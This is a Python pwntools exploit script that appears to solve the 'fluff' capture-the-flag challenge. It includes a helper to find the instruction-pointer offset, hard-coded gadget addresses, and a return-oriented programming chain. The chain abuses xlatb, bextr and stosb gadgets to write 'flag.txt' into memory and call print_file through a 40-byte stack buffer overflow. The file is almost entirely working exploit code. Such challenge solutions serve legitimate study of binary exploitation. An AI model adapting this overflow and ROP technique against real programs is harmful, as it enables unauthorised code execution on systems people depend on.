from typing import Tuple

from pwn import *

HOST = ""
PORT = ""

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level="warn")
    p.sendlineafter(b">", payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *print_file
b *pwnme+150
b *pwnme+266
continue
""".format(
    **locals()
)

# Binary filename
exe = "./fluff"
# exe = "./fluff32"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"
context.terminal = "tmux splitw -h".split(" ")
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

"""
  xlatb: Apparently, this operation uses the AL register contents (which is the least significant bytes of the least significant half of the RAX registry) to locate an entry in a table in memory, the RBX register to be precise, then it copies the contents of the table back to the AL register, so with this operation we control the AL register.

  bextr: From the reference: “Extracts contiguous bits from the first source operand (the second operand) using an index value and length value specified in the second source operand (the third operand)”. We can use this one to control the RBX register

  stosb: This operation stores a byte from the AL register (in our case) into RDI.
"""
RCX_CONSTANT = 0x3EF2
GET_AL_FROM_RBX_RET = 0x400628  # xlat   BYTE PTR ds:[rbx]
POP_RDX_RCX_BEXTR_RBX_RCX_RDX = 0x40062A  # bextr  rbx,rcx,rdx
STORE_AL_TO_RDI_RET = 0x400639  #  stos BYTE PTR es:[rdi],al
POP_RBX = 0x40069A  # pop rbx; ret
POP_RDI = 0x00000000004006A3  # pop rdi ; ret
writable_data_section = 0x0000000000601028
RET = elf.search(asm("ret")).__next__()

# Pass in pattern_size, get back EIP/RIP offset
offset = 40

# Start program
io = start()

# Build the payload


def find_char_location_in_elf(strings):
    char_location = []
    for i in range(len(strings)):
        char_addr = (
            read(exe).find(strings[i]) + elf.address
        )  # Get char location in binary
        char_location.append(char_addr)

    return char_location


def write_address(RBX, RDI, offset, index):

    # Change RBX
    payload = p64(POP_RDX_RCX_BEXTR_RBX_RCX_RDX)
    payload += p64(0x4000)  # Length 40 -> 64 bit
    payload += p64(RBX - RCX_CONSTANT - index)

    # Get char from RBX
    payload += p64(GET_AL_FROM_RBX_RET)

    # Store to RDI
    payload += p64(STORE_AL_TO_RDI_RET)
    return payload


def generate_payload():
    payload_chain = b""

    flag = b"flag.txt"
    CURRENT_RAX_INDEX = 0xB

    payload_chain = p64(POP_RDI)
    payload_chain += p64(writable_data_section)

    RBX_LIST = find_char_location_in_elf(flag)

    for index, RBX in enumerate(RBX_LIST):
        info("RBX: " + hex(RBX))
        if index != 0:
            CURRENT_RAX_INDEX = flag[index - 1]
        info("ADDR: " + hex(RBX - CURRENT_RAX_INDEX - RCX_CONSTANT))
        payload_chain += write_address(
            RBX, writable_data_section, index, CURRENT_RAX_INDEX
        )

    return payload_chain


# 64
payload = flat(
    {
        offset: [
            generate_payload(),
            POP_RDI,
            writable_data_section,
            RET,
            RET,
            elf.plt["print_file"],
        ]
    }
)

# 32
# payload = flat({offset: [elf.sym["ret2win"]]})

# Send the payload
io.sendafter(b"> ", payload)
io.recvuntil(b"Thank you!")

# Got Shell?
io.interactive()
